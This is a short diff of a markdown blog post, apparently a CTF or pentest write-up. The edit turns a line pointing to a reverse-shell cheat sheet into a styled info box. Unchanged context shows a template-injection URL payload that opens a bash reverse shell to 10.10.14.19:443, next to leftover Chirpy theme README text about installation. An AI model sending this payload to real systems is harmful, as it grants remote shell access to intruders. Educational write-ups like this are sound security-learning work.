@@ -107,7 +107,9 @@ so that POC instead of that payload, we are replace for a reverse shell payload
 ```console
 http://example.com/?name=#{'%20`bash -c "bash -i >& /dev/tcp/10.10.14.19/443 0>&1"`'}
 ```
-/you have that [web](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) if you want try another method ;)/
+> you have that [web](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) if you want try another method ;).
+{: .prompt-info }
+
 
 - [**Using the Chirpy Starter**](#option-1-using-the-chirpy-starter) - Easy to upgrade, isolates irrelevant project files so you can focus on writing.
 - [**Forking on GitHub**](#option-2-forking-on-github) - Convenient for custom development, but difficult to upgrade. Unless you are familiar with Jekyll and are determined to tweak or contribute to this project, this approach is not recommended.
